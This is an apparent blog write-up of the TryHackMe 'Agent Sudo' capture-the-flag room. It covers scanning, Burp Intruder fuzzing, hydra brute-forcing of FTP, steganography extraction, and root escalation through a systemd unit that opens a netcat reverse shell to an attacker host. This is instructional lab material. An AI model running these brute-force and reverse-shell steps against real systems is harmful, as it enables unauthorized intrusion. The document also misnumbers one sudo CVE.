---
title: "Agent Sudo Writeup"
tags: writeup tryhackme
---

# [agentsudoctf](https://tryhackme.com/room/agentsudoctf)

## Enumeration
A quick rust scan finds 3 ports are open
```shell
$ rustscan -t 2500 -b 65535 --accessible -a ${TARGETIP} -- -A
Open 10.10.203.67:21
Open 10.10.203.67:22
Open 10.10.203.67:80
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
// Truncated for niceness
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
#### rustscan flags

| flag | explanation |
| :--: | :---------- |
| `-t 2500` | Increases the port timeout (to 2.5seconds), this improves accuracy especially over the VPN |
| `-b 65535` | Tells rustscan to scan all 65535 ports at once, you need to run `ulimit -n 70000` before running rustscan to use this |
| `--accessible` | Makes the output more tidy |
| `-a ${TARGETIP}` | Tells rustscan what ip to scan |
| `--` | Splits the rustscan arguments from the arguments provided to nmap |
| `-A` | Tells nmap to do an aggressive scan |

### The website
The note on the main page tells us to
> Use your own codename as user-agent to access the site.
The from section tells us the person who left this message's codename is **R**.
Using BURP intruder we can brute force this.

First we send the standard request to burp intruder.
![send to intruder](/assets/agentsudoctf/burp-http-log.png)

Then we add the `§` around where we want intruder to modify.
![positions](/assets/agentsudoctf/burp-intruder-positions.png)

Then we add our payload (the upper case alphabet)
![payload](/assets/agentsudoctf/burp-intruder-payload.png)

Then we start the attack, and notice that agent C has a slightly longer response than everyone else.
This is because he is being redirect to `agent_C_attention.php`

![flag](/assets/agentsudoctf/burp-intruder-found.png)

The page says
> Attention chris,
> 
> Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
> 
> From,
> Agent R

Now we have chris's name and know his password is weak it's time to try brute forcing it.
We know we're cracking FTP because the BOX asks for the FTP password next.

### FTP
```shell
$ hydra -l "chris" -P /usr/share/wordlists/rockyou.txt ${TARGETIP} ftp -t 20
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-13 21:17:17
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 20 tasks per 1 server, overall 20 tasks, 14344399 login tries (l:1/p:14344399), ~717220 tries per task
[DATA] attacking ftp://10.10.203.67:21/
[STATUS] 165.00 tries/min, 165 tries in 00:01h, 14344234 to do in 1448:55h, 20 active
[21][ftp] host: 10.10.203.67   login: chris   password: XXXXXXX
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-13 21:18:53
```
#### Hydra flags

| flag | explanation |
| `-l "chris"` | Tells hydra to try the username "chris" (no list) |
| `-P /usr/share/wordlists/rockyou.txt` | Tells hydra to use the rockyou wordlist (very common in CTFs) for passwords |
| `${TARGETIP}` | IP to attack | 
| `ftp` | The service hydra should try to brute force |
| `-t 20` | Run 20 threads at once (maximum) to speed up the attack |

Upon accessing the ftp we get 3 files, a text file telling us the images contain the data we want. And 2 images a jpg and a png.
steghide only works on jpg however trying that without a password it cannot find anything
```shell
$ steghide info ./cute-alien.jpg
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

However if we binwalk the png we find it contains a zip file
```shell
$ binwalk ./cutie.png
ECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

We can extract this with `binwalk -e`
```shell
$ binwalk -e ./cutie.png
$ cd _cutie.png.extracted
$ ls
365  365.zlib  8702.zip  To_agentR.txt
```
The `To_agentR.txt` file is empty because binwalk tried to extract it from the zip but didn't have the password.
To crack the zip we can use john:
```shell
$ /usr/sbin/zip2john ./8702.zip > ./zip.hash
ver 81.9 ./8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
$ john ./zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
Which gives us the zip file :). The extracted note states.
> Agent C,
> 
> We need to send the picture to 'XXXXXXXX' as soon as possible!
> 
> By,
> Agent R
Putting the string in quotes in [cyberchef](https://gchq.github.io/CyberChef) it is auto detected as base64, after un-base64ing
we can presume the resulting string is the password for the steg file because that's the next step in the box :).

Sure enough using steghide we extract a file.
```shell
$ steghide extract -p "${DECRYPTED_STRING}" -sf ./cute-alien.jpg
wrote extracted data to "message.txt".
```
Within message.txt we are straight up given james' plain text password. Time to use this for ssh :).

After sshing in we can find the user flag and an image file.
```shell
$ ls
Alien_autospy.jpg user_flag.txt
```
After we've entered the user flag the box asks us about the image. We can download it using scp (ssh copy) (run the command on your machine).
```shell
$ scp james@${TARGETIP}:Alien_autospy.jpg .
james@10.10.203.67's password:
Alien_autospy.jpg                                        41KB 161.5KB/s   00:00
```

If we then upload this image to [tineye](https://tineye.com) we find a Fox News article containing the image and the phrase needed to solve the challenge.

## Privesc
Enumerating the box we find with sudo james can execute bash as everyone except root.
```shell
$ sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
After searching the sudo version (1.8.21p2) on searchsploit I didn't find any exploits to get around this. However I did notice
James was in the `adm` group.
```shell
$ id
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),46(plugdev),lxd(108)
```
The `adm` group on linux means you have special access to using `systemctl` (systemd). Meaning we
might be able to use systemctl to get root.
Sure enough if we enter out password we are able to access restricted systemctl commands
```shell
$ systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: james
Password: 
==== AUTHENTICATION COMPLETE ===
```
Using a slightly modified version of a [GTFObins exploit](https://gtfobins.github.io/gtfobins/systemctl/#suid) I got root.
Make sure to replace `${HOSTIP}` and `${HOSTPORT}` with your reverse shell ip and port.

```shell
$ TF=$(mktemp).service
$ echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "rm /tmp/p;mkfifo /tmp/p;nc ${HOSTIP} ${HOSTPORT} 0</tmp/p|/bin/sh > /tmp/p 2>&1;rm /tmp/p"
[Install]
WantedBy=multi-user.target' > $TF
$ systemctl link $TF
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-unit-files ===
Authentication is required to manage system service or unit files.
Authenticating as: james
Password: 
==== AUTHENTICATION COMPLETE ===
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: james
Password: 
==== AUTHENTICATION COMPLETE ===
$ systemctl enable --now $TF
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-unit-files ===
Authentication is required to manage system service or unit files.
Authenticating as: james
Password: 
==== AUTHENTICATION COMPLETE ===
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: james
Password: 
==== AUTHENTICATION COMPLETE ===
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
Authentication is required to start 'tmp.OLImCzDjDY.service'.
Authenticating as: james
Password: 
==== AUTHENTICATION COMPLETE ===
Job for tmp.OLImCzDjDY.service canceled.
```

Sure enough we get root in our reverse shell and can get the root flag. However there is not CVE for this
`adm` group is an intended feature. Upon looking at another writeup I found I was meant to use [CVE-2019-14297](https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/)
to exploit the sudo priveledges. But we got there a different way :).
